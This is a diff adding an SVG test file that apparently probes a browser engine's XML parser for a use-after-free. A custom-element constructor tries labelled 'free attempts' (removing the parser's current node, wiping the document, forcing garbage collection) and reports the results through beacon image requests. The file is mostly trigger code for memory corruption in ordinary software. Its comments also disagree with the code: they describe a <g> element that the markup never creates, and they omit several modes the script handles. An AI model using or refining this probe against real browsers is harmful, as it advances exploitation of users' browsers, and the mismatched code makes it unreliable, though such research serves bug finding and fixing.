@@ -1,0 +1,101 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!-- docs/75 probe: is the XML parser's custom-element window (xml/parser/XMLDocumentParserLibxml2.cpp:856-858)
+     a script window whose tail reads a raw ContainerNode* (m_currentNode, XMLDocumentParser.h:162)?
+       reg=0        do not define x-a            (no `willConstructCustomElement`, no reaction drain)
+       atk=none     define x-a, constructor does nothing
+       atk=rm       define x-a, constructor removes the parser's current node (<g>) but allocates nothing
+       atk=gc       define x-a, constructor allocates (Eden GC) without removing anything
+       atk=rmgc     define x-a, constructor removes <g> and allocates (the free attempt)
+     Every beacon is an <img> created in the XHTML namespace (an SVG document has no HTML Image() global). -->
+<svg xmlns="http://www.w3.org/2000/svg" width="120" height="40" id="svgroot">
+<script type="application/ecmascript"><![CDATA[
+var q = new URLSearchParams((document.URL.split('?')[1]) || '');
+var reg = q.get('reg') !== '0';
+var atk = q.get('atk') || 'none';
+var HTMLNS = 'http://www.w3.org/1999/xhtml';
+function ev(m) {
+    try {
+        var img = document.createElementNS(HTMLNS, 'img');
+        img.setAttribute('width', '1');
+        img.src = '/ev?m=' + encodeURIComponent(m);
+    } catch (e) { }
+}
+ev('START reg=' + reg + ' atk=' + atk + ' root=' + (document.documentElement ? document.documentElement.tagName : 'none'));
+if (reg) {
+    try {
+        customElements.define('x-a', class extends HTMLElement {
+            constructor() {
+                super();
+                ev('CTOR atk=' + atk);
+                if (atk === 'rm' || atk === 'rmgc') {
+                    var g = document.querySelector('g');
+                    var found = !!g;
+                    if (g)
+                        g.remove();
+                    g = null;
+                    ev('RM found=' + found + ' gone=' + !document.querySelector('g'));
+                }
+                if (atk === 'wipe') {
+                    // No wrapper for <g> or <svg> is ever created: replaceChildren on the document drops the
+                    // tree refs in C++ only, and Document::childrenChanged recomputes m_documentElement, so
+                    // the root and its subtree die synchronously -- no GC needed.
+                    ev('WIPE before kids=' + document.childNodes.length);
+                    document.replaceChildren();
+                    ev('WIPE after kids=' + document.childNodes.length + ' root=' + (document.documentElement ? 'yes' : 'no'));
+                }
+                if (atk === 'wipeg') {
+                    // Only the parser's current node (<g>) loses its last reference: the document and <svg>
+                    // stay alive, so a tail that runs proves the parser got past :858 and the freed object is
+                    // what it read. A wrapper exists for <svg> (documentElement) but never for <g>.
+                    var svg = document.documentElement;
+                    ev('WIPEG before kids=' + svg.childNodes.length);
+                    svg.replaceChildren();
+                    ev('WIPEG after kids=' + svg.childNodes.length + ' doc=' + (document.documentElement ? 'yes' : 'no'));
+                }
+                if (atk === 'gc' || atk === 'rmgc') {
+                    var junk = [];
+                    for (var i = 0; i < 200000; i++) {
+                        junk.push({ a: i, b: 'str' + i, c: [i, i + 1] });
+                        if ((i % 50000) === 0)
+                            ev('ALLOC i=' + i);
+                    }
+                    ev('ALLOC done n=' + junk.length);
+                }
+                if (atk === 'wref') {
+                    // Diagnostic, not a free attempt: does an allocation inside the window actually run a GC
+                    // that collects an unreferenced wrapper? WeakRef.deref() in a later job answers it.
+                    var probe = document.createElementNS(HTMLNS, 'div');
+                    var wr = new WeakRef(probe);
+                    probe = null;
+                    ev('WREF armed');
+                    var junk = [];
+                    for (var i = 0; i < 200000; i++)
+                        junk.push({ a: i, b: 'str' + i, c: [i, i + 1] });
+                    ev('WREF alloc done');
+                    setTimeout(function () {
+                        ev('WREF later alive=' + (wr.deref() ? 'yes' : 'no'));
+                    }, 200);
+                }
+                setTimeout(function () {
+                    ev('LATE root=' + (document.documentElement ? 'yes' : 'no')
+                        + ' g=' + document.getElementsByTagName('g').length
+                        + ' xa=' + document.getElementsByTagName('x-a').length
+                        + ' text=' + document.getElementsByTagName('text').length);
+                }, 150);
+                ev('CTOR done');
+            }
+        });
+        ev('DEF ok');
+    } catch (e) { ev('DEFERR ' + e.name + ':' + e.message); }
+}
+]]></script>
+<div xmlns="http://www.w3.org/1999/xhtml" id="g"><x-a xmlns="http://www.w3.org/1999/xhtml"></x-a></div>
+<text x="2" y="20">x</text>
+<script type="application/ecmascript"><![CDATA[
+(function () {
+    var g2 = document.querySelector('g');
+    var xa = document.getElementsByTagName('x-a');
+    ev('TAIL g=' + !!g2 + ' xa=' + xa.length + ' xaparent=' + (xa.length ? (xa[0].parentNode ? xa[0].parentNode.nodeName : 'null') : '-'));
+})();
+]]></script>
+</svg>
